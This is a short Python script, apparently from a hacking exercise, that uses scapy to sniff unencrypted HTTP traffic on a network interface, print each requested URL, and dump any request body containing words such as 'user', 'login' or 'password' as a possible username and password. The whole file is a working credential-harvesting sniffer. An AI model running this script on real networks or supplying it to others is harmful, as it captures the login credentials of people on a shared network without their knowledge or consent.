#!/usr/bin/env python

#only work with http not https...
#grab urls and possible user/pass combo

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    #BPF filter syntaxe
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["user", "Log", "login", "username", "UserName", "email", "pass", "password", "Pass"]
        for key in keywords:
            if key in load:
                return load


def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[*] Possible username/password >> " + login_info + "\n\n")



sniff("en0")
